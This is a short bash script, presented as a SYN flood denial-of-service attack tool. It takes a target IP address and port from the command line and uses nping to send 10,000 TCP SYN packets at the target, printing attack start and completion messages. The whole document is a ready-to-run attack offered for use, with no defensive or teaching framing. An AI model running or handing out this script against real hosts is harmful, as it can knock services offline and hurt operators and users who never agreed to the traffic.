#!/bin/bash
# SYN Flood - Denial of Service Attack
# Options:
# <target_ip> : Target IP address
# <target_port> : Target port

# Usage: syn_flood.sh <target_ip> <target_port>
# Example script
# syn_flood.sh 192.168.1.1 80

# Check if nping is installed
if ! command -v nping &> /dev/null
then
    echo "nping could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_ip> <target_port>"
    exit 1
fi

TARGET_IP=$1
TARGET_PORT=$2

echo "Starting SYN Flood attack on $TARGET_IP:$TARGET_PORT"

# Perform SYN Flood attack
nping --tcp -c 10000 --flags syn -p $TARGET_PORT $TARGET_IP

echo "SYN Flood attack completed."
